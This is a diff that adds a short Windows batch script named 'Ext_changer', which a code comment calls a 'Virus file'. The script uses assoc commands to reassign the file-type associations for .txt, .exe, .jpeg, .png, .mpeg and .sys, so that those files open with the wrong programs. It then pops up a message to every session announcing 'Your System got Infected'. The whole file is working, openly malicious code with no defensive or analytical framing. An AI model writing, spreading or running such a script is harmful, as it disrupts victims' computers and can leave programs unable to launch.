@@ -1,0 +1,13 @@
+@echo off
+title Ext_changer
+C:
+color a
+Rem This Virus file replaces the actual file extensions with the given extensions
+@echo off
+assoc .txt=jpegfile
+assoc .exe=htmlfile
+assoc .jpeg=avifile
+assoc .png=mpegfile
+assoc .mpeg=txtfile
+assoc .sys=regfile
+msg * Your System got Infected...
